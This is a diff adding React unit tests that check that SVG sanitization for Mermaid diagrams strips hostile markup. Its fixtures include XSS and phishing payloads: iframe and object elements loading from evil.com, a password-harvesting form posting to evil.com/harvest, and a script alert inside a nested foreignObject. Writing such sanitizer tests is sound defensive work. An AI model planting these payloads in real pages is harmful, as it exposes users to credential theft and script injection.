@@ -203,6 +203,108 @@ describe('RenderedMarkdown', () => {
       });
     });
 
+    it('strips iframe and object elements inside foreignObject', async () => {
+      // iframe and object are the highest-severity blocked elements in the
+      // HTML subtree that foreignObject enables. The security comment in
+      // SVG_SANITIZE_CONFIG explicitly lists them as stripped by DOMPurify.
+      const maliciousSvg = [
+        '<svg><foreignObject>',
+        '<div>',
+        '<iframe src="https://evil.com/"></iframe>',
+        '<object data="https://evil.com/evil.swf"></object>',
+        '<span>Safe content</span>',
+        '</div>',
+        '</foreignObject></svg>',
+      ].join('');
+      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
+
+      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
+
+      await waitFor(() => {
+        const diagram = screen.getByTestId('mermaid-diagram');
+        expect(diagram.innerHTML).toContain('Safe content');
+        expect(diagram.innerHTML).toContain('foreignObject');
+        expect(diagram.innerHTML).not.toContain('<iframe');
+        expect(diagram.innerHTML).not.toContain('<object');
+        expect(diagram.innerHTML).not.toContain('evil.com');
+      });
+    });
+
+    it('strips form and input elements inside foreignObject', async () => {
+      // form/input inside foreignObject could be used for credential harvesting
+      // via phishing overlays. Verified blocked by ADD_TAGS omission.
+      const maliciousSvg = [
+        '<svg><foreignObject>',
+        '<div>',
+        '<form action="https://evil.com/harvest"><input type="password" name="pw"/></form>',
+        '<span>Node Label</span>',
+        '</div>',
+        '</foreignObject></svg>',
+      ].join('');
+      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
+
+      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
+
+      await waitFor(() => {
+        const diagram = screen.getByTestId('mermaid-diagram');
+        expect(diagram.innerHTML).toContain('Node Label');
+        expect(diagram.innerHTML).not.toContain('<form');
+        expect(diagram.innerHTML).not.toContain('<input');
+        expect(diagram.innerHTML).not.toContain('evil.com');
+      });
+    });
+
+    it('preserves multiple foreignObject elements in one SVG (multi-node flowchart)', async () => {
+      // A real Mermaid flowchart with N nodes produces N foreignObject elements.
+      // Verify that sanitization preserves all of them, not just the first.
+      const multiNodeSvg = [
+        '<svg>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node B</span></div></foreignObject>',
+        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node C</span></div></foreignObject>',
+        '</svg>',
+      ].join('');
+      mocks.mermaidRender.mockResolvedValue({ svg: multiNodeSvg });
+
+      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
+
+      await waitFor(() => {
+        const diagram = screen.getByTestId('mermaid-diagram');
+        expect(diagram.innerHTML).toContain('Node A');
+        expect(diagram.innerHTML).toContain('Node B');
+        expect(diagram.innerHTML).toContain('Node C');
+        // All three foreignObject containers must be present
+        const matches = diagram.innerHTML.match(/foreignObject/gi) ?? [];
+        // Each foreignObject has an open and close tag → 6 occurrences for 3 elements
+        expect(matches.length).toBeGreaterThanOrEqual(3);
+      });
+    });
+
+    it('strips nested foreignObject elements', async () => {
+      // Nested foreignObject is invalid per the SVG spec but may appear in
+      // attacker-crafted SVG. DOMPurify should remove the inner element.
+      const nestedSvg = [
+        '<svg>',
+        '<foreignObject width="100" height="40">',
+        '<div xmlns="http://www.w3.org/1999/xhtml">',
+        '<span>Outer label</span>',
+        '<foreignObject width="50" height="20"><div><script>alert(1)</script></div></foreignObject>',
+        '</div>',
+        '</foreignObject>',
+        '</svg>',
+      ].join('');
+      mocks.mermaidRender.mockResolvedValue({ svg: nestedSvg });
+
+      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
+
+      await waitFor(() => {
+        const diagram = screen.getByTestId('mermaid-diagram');
+        expect(diagram.innerHTML).toContain('Outer label');
+        expect(diagram.innerHTML).not.toContain('<script');
+        expect(diagram.innerHTML).not.toContain('alert');
+      });
+    });
+
     it('preserves valid SVG content through sanitization', async () => {
       const validSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>';
       mocks.mermaidRender.mockResolvedValue({ svg: validSvg });
@@ -216,6 +318,33 @@ describe('RenderedMarkdown', () => {
         expect(diagram.innerHTML).toContain('<rect');
         expect(diagram.innerHTML).toContain('<text');
         expect(diagram.innerHTML).toContain('fill="#1a3a32"');
+      });
+    });
+
+    it('preserves sequence diagram SVG using text elements (no foreignObject)', async () => {
+      // Sequence diagrams use <text> elements directly, not foreignObject.
+      // Verify the ADD_TAGS/HTML_INTEGRATION_POINTS changes do not regress them.
+      const sequenceSvg = [
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300">',
+        '<rect x="50" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/>',
+        '<text x="110" y="35" text-anchor="middle" fill="#e6f2ee">Alice</text>',
+        '<rect x="250" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/>',
+        '<text x="310" y="35" text-anchor="middle" fill="#e6f2ee">Bob</text>',
+        '<line x1="110" y1="50" x2="310" y2="80" stroke="#9fb7ae"/>',
+        '<text x="210" y="70" text-anchor="middle" fill="#e6f2ee">Hello</text>',
+        '</svg>',
+      ].join('');
+      mocks.mermaidRender.mockResolvedValue({ svg: sequenceSvg });
+
+      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
+
+      await waitFor(() => {
+        const diagram = screen.getByTestId('mermaid-diagram');
+        expect(diagram.innerHTML).toContain('Alice');
+        expect(diagram.innerHTML).toContain('Bob');
+        expect(diagram.innerHTML).toContain('Hello');
+        expect(diagram.innerHTML).toContain('<text');
+        expect(diagram.innerHTML).toContain('<line');
       });
     });
 
@@ -248,14 +377,18 @@ describe('RenderedMarkdown', () => {
       // foreignObject and HTML elements must be in ADD_TAGS (extends SVG profile)
       // Note: jsdom normalizes SVG tag names to lowercase at runtime
       const addTagsLower = SVG_SANITIZE_CONFIG.ADD_TAGS!.map((t: string) => t.toLowerCase());
-      const requiredAddTags = ['foreignobject', 'div', 'span'];
+      // All five tags that Mermaid v11 generates inside foreignObject must be present
+      const requiredAddTags = ['foreignobject', 'div', 'span', 'p', 'br'];
       for (const tag of requiredAddTags) {
         expect(addTagsLower).toContain(tag);
       }
 
-      // HTML_INTEGRATION_POINTS must include foreignobject for namespace bridging
+      // HTML_INTEGRATION_POINTS must include both foreignobject (SVG→HTML bridge)
+      // and annotation-xml (MathML→HTML bridge) for namespace bridging
       expect(SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS).toBeDefined();
-      expect((SVG_SANITIZE_CONFIG as Record<string, unknown>).HTML_INTEGRATION_POINTS).toHaveProperty('foreignobject', true);
+      const integrationPoints = SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS as Record<string, unknown>;
+      expect(integrationPoints).toHaveProperty('foreignobject', true);
+      expect(integrationPoints).toHaveProperty('annotation-xml', true);
     });
 
     it('preserves complex Mermaid SVG with gradients, markers, and filters', async () => {
